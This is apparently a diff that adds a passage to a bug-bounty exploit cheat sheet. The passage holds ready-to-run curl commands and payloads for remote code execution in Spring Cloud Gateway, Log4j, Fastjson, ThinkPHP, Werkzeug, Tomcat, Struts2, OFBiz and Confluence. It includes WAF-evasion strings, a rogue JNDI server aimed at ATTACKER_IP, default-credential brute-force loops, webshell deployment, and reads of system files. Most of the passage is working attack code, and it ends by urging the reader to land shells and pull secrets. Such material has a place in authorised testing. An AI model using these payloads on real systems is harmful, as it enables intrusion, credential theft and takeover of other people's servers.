+  -H "Content-Type: application/json" -d '{
+  "id":"poc","filters":[{"name":"AddResponseHeader","args":{
+    "name":"Result",
+    "value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
+  }}],"uri":"http://example.com"}'
+# 2. Refresh to evaluate the SpEL, 3. hit the route to read output in the Result header, 4. delete route
+curl -s -X POST "https://target.com/actuator/gateway/refresh"
+curl -si "https://target.com/actuator/gateway/routes/poc" | grep -i Result
+curl -s -X DELETE "https://target.com/actuator/gateway/routes/poc"
+```
+
+---
+
+### Log4Shell — Log4j JNDI (CVE-2021-44228)
+
+**Fingerprint:** any Java app that logs user input — User-Agent, `X-Api-Version`, `Referer`, username fields, search boxes. No version banner needed; spray the marker and watch for a callback.
+
+```bash
+# Detection — OAST DNS/LDAP callback. Use interactsh-client / Burp Collaborator for OAST.
+PAYLOAD='${jndi:ldap://${hostName}.OAST_ID.oast.site/a}'   # ${hostName} tags which host fired
+curl -s "https://target.com/" \
+  -H "User-Agent: $PAYLOAD" -H "X-Api-Version: $PAYLOAD" -H "Referer: $PAYLOAD"
+# WAF-evasion variants if the literal is filtered:
+# ${${::-j}ndi:${::-l}${::-d}${::-a}${::-p}://x.oast.site/a}
+# ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://x.oast.site/a}
+# ${jndi:dns://x.oast.site/a}   (DNS-only — proves reachability even if LDAP egress is blocked)
+```
+
+> **Submittable:** an OAST hit you control proving server-side JNDI lookup (the `${hostName}`/`${env:...}` exfil variant strengthens it by leaking real data). DNS-only callback = Medium; full LDAP-gadget RCE = Critical. **N/A:** no callback (target patched or not logging that sink).
+
+---
+
+### Fastjson / Jackson AutoType (JNDI Deserialization)
+
+**Fingerprint:** Java API that parses a JSON request body and reflects/echoes it; sending an extra `@type` key changes behavior or errors with `autoType is not support`.
+
+```bash
+# Detection — DNS probe via JdbcRowSetImpl (works <= 1.2.80 patterns; SafeMode off)
+curl -s "https://target.com/api/x" -H "Content-Type: application/json" -d '{
+  "@type":"com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName":"ldap://OAST_ID.oast.site/a",
+  "autoCommit":true
+}'
+# OAST DNS hit = AutoType reachable. Jackson equivalent abuses polymorphic @class / enableDefaultTyping.
+```
+
+**Exploit (Critical, RCE):** stand up a malicious JNDI server, then point `dataSourceName` at it.
+```bash
+# JNDI-Exploit-Kit / rogue-jndi serves an LDAP/RMI ref that returns an RCE gadget
+java -jar JNDIExploit.jar -i ATTACKER_IP
+# dataSourceName -> ldap://ATTACKER_IP:1389/Basic/Command/base64/<payload>
+```
+> **Note:** post-JDK-8u191, attacker JNDI must use a local-classpath gadget (BeanFactory/ELProcessor) instead of remote codebase. **Submittable:** OAST hit + landed gadget (reflected command output / shell). **N/A:** `autoType is not support` returned = blocked, move on.
+
+---
+
+### ThinkPHP 5.x RCE (`invokefunction`)
+
+**Fingerprint:** PHP app, `?s=` routing in URLs, `think\` namespace in errors, `Set-Cookie: PHPSESSID`. Affected: 5.0.5–5.0.22 and 5.1.x before 5.1.31.
+
+```bash
+# Detection + RCE in one shot (5.0.x) — reflected command output = confirmed
+curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" | grep -i 'php version'
+
+# RCE — run a command (5.0.x)
+curl -s "https://target.com/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
+
+# 5.1.x variant (no index.php prefix needed; abuses filter/Request)
+curl -s "https://target.com/?s=index/\think\Request/input&filter[]=system&data=id"
+curl -s "https://target.com/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
+```
+
+> **Submittable:** reflected `id`/`phpinfo()` output. **N/A:** 404/200 with no command echo (patched or non-vuln minor).
+
+---
+
+### Flask / Werkzeug Debug Console (PIN Regeneration)
+
+**Fingerprint:** `Server: Werkzeug/...` header, an interactive traceback page on error, or `/console` returning a PIN prompt — means `debug=True` shipped to prod.
+
+```bash
+# Detection — does the debug console exist?
+curl -s "https://target.com/console" | grep -i 'pin\|werkzeug\|interactive'
+# Trigger a traceback to confirm debug mode (any 500-inducing input)
+```
+
+**Exploit (Critical, RCE) — regenerate the PIN when you also have an LFI / path traversal:**
+The PIN is deterministic from local files. With an LFI primitive (see Path Traversal payloads) read the six inputs, then reproduce the PIN offline:
+```bash
+# Leak the PIN ingredients via LFI:
+#   username       -> /etc/passwd (the user running the app, e.g. www-data)
+#   modname        -> usually 'flask.app'
+#   appname        -> usually 'Flask'
+#   app file path  -> .../site-packages/flask/app.py   (from the traceback)
+#   MAC (decimal)  -> /sys/class/net/eth0/address  -> int(mac.replace(':',''),16)
+#   machine-id     -> /etc/machine-id  (+ /proc/self/cgroup docker id if containerized)
+# Feed all six into the public Werkzeug PIN algorithm, submit at /console -> Python REPL:
+#   __import__('os').popen('id').read()
+```
+
+> **Submittable:** code execution in the console (proves debug-prod + PIN broken). Even debug=True alone with the interactive traceback is a reportable info-leak (source + local vars + env). **N/A:** generic 500 page with no interactive traceback.
+
+---
+
+### Tomcat Manager — Weak Creds + WAR Deploy / PUT Write
+
+**Fingerprint:** `Server: Apache-Coyote/1.1`, `JSESSIONID` cookie, `/manager/html` prompts Basic-Auth.
+
+```bash
+# Detection — default/weak manager creds (try the classic shortlist, throttle to respect rate limits)
+for cred in tomcat:tomcat admin:admin tomcat:s3cret admin:tomcat manager:manager tomcat:admin; do
+  curl -s -o /dev/null -w "$cred -> %{http_code}\n" -u "$cred" "https://target.com/manager/text/list"
+done   # 200 = authenticated to Manager
+```
+
+**Exploit A (Critical, RCE) — deploy a JSP webshell WAR:**
+```bash
+# Build a minimal WAR with a cmd JSP, then deploy via the text API
+curl -s -u USER:PASS -T shell.war "https://target.com/manager/text/deploy?path=/poc&update=true"
+curl -s "https://target.com/poc/shell.jsp?cmd=id"
+```
+
+**Exploit B (Critical, RCE) — PUT JSP write, CVE-2017-12615 (Windows, `readonly=false`):**
+```bash
+curl -s -X PUT "https://target.com/poc.jsp/" --data-binary @shell.jsp   # trailing slash bypasses block
+curl -s "https://target.com/poc.jsp?cmd=id"
+```
+
+> **Submittable:** authenticated Manager access (already High — it is admin of the app server) escalated to deployed-shell command output. **N/A:** Manager page reachable but every credential returns 401/403.
+
+---
+
+### Struts2 OGNL (S2-045 / S2-046, CVE-2017-5638)
+
+**Fingerprint:** `.action` / `.do` URLs, `Struts` in stack traces, OGNL artifacts. S2-045 lives in the Jakarta multipart parser via a malicious `Content-Type`.
+
+```bash
+# Detection + RCE (S2-045) — command output reflected in a custom header
+curl -s -D - "https://target.com/index.action" \
+  -H "Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#ct.setMemberAccess(#dm)).(#cmd='id').(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+```
+
+> **Submittable:** reflected command output in the response/header. **N/A:** no output (likely patched — Struts2 OGNL is heavily virtual-patched by WAFs; a 403 here is often the WAF, not the fix).
+
+---
+
+### Apache OFBiz — Unauthenticated RCE (CVE-2023-49070 / CVE-2024-45195)
+
+**Fingerprint:** `/control/main`, `OFBiz` in the title/headers, `/webtools/control/...` paths. Affected: < 18.12.10 (XML-RPC chain) and < 18.12.16 (view-auth bypass chain).
+
+```bash
+# Detection — is the auth-bypass view reachable? (override params force an unauthenticated screen render)
+curl -sk "https://target.com/webtools/control/ViewBlogArticle?USERNAME=&PASSWORD=&requirePasswordChange=Y" -o /dev/null -w "%{http_code}\n"
+# CVE-2023-49070: legacy XML-RPC endpoint still mounted
+curl -sk -o /dev/null -w "%{http_code}\n" "https://target.com/webtools/control/xmlrpc"
+```
+
+**Exploit (Critical, unauthenticated RCE):** the auth bypass (`requirePasswordChange=Y` / empty-creds override) reaches a screen that renders a Groovy program; chain to `ProgramExport`/XML-RPC deserialization to run a command. Use the public PoCs (jakabakos/Apache-OFBiz-Authentication-Bypass) to drive the request set, then confirm with an OAST callback or reflected output.
+
+> **Submittable:** proven command execution via the bypass chain. **N/A:** login page reachable but the override params still demand auth (patched ≥ 18.12.16).
+
+---
+
+### Confluence / Atlassian OGNL (CVE-2022-26134)
+
+**Fingerprint:** `X-Confluence-Request-Time` header, `/wiki` base, Atlassian footer. Pre-auth OGNL injection — the URL namespace is evaluated as OGNL.
+
+```bash
+# Detection + RCE — command output returned in the X-Cmd-Response header (one request)
+curl -sk -D - -o /dev/null "https://target.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
+# Decoded namespace: ${(#a=@org.apache.commons.io.IOUtils@toString(
+#   @java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).
+#   (@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
+# A populated X-Cmd-Response header in the reply = confirmed unauthenticated RCE.
+```
+
+> **Submittable:** `X-Cmd-Response` containing real command output. Affected: all supported versions before 7.4.17 / 7.13.7 / 7.14.3 / 7.15.2 / 7.16.4 / 7.17.4 / 7.18.1. **N/A:** header absent (patched). Note many Confluence instances are vendor-hosted — check scope and asset ownership before firing.
+
+---
+
+> **Chain note:** these often escalate — Spring heapdump -> AWS keys -> see SSRF class / cloud-metadata pivot; Tomcat/Confluence/OFBiz shell -> internal network -> SSRF and IDOR on adjacent services. Pull the secret or land the shell first, then map what it unlocks before writing the report.
